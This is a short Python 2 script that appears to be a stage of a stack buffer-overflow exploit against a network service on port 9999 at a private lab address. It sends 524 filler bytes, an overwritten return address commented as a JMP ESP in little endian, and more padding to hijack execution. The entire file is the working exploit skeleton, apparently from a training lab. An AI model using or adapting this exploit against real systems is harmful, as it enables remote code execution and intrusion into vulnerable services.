import socket
import sys
from time import sleep

badchars = ()

buffer = 'A' * 524 + '\xF3\x12\x17\x31'  + 'C' * 522		# JMP ESP noted in little endian

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.,,'
  s.send(buffer + '\r\n')
  s.close()
  print '[!] Done.'
except:
  print '[!] Could not connect to target, exiting.'
  sys.exit()

